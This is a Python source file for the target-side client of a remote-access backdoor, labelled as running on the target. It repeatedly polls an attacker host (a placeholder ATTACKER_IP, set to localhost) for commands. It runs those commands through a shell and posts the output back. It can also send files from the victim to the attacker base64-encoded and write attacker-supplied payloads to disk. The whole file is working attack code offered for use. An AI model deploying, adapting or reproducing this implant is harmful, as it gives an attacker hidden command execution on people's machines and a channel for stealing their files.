#Client ---> runs on target

from urllib import request, parse
import subprocess
import time
import os
import requests
import base64
ATTACKER_IP = 'localhost' 
ATTACKER_PORT = 8080
ID = '1'
def send_post(data):
    requests.post(f'http://{ATTACKER_IP}:{ATTACKER_PORT}/response/sad',cookies={"id":ID},data={"rfile":data})


def run_command(command):
    CMD = subprocess.Popen(command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    send_post(CMD.stdout.read())
    send_post(CMD.stderr.read())

def upload():
    req = requests.get(f'http://{ATTACKER_IP}:{ATTACKER_PORT}/upload/sad',cookies={"id":ID}).text
    req = base64.b64decode(req)
    file = open("file2", 'wb')
    file.write(req)
    exit()
def download(path):
    
    file = open(path,"r").read()
    file = base64.b64encode(file.encode()).decode("utf8")
    requests.post(f'http://{ATTACKER_IP}:{ATTACKER_PORT}/download',cookies={"id":ID},data={"rfile":file})
while True:
    command = requests.get(f"http://{ATTACKER_IP}:{ATTACKER_PORT}/getcommand",cookies={"id":ID}).text
    if 'terminate' in command:
        break
    elif 'download' == command[0:8]:
        download(command.replace("download ",""))
    elif '!upload' == command[0:7]:
        upload()

    elif command.strip(" ") == "none":
        time.sleep(5)
    else:
        run_command(command)
        time.sleep(1)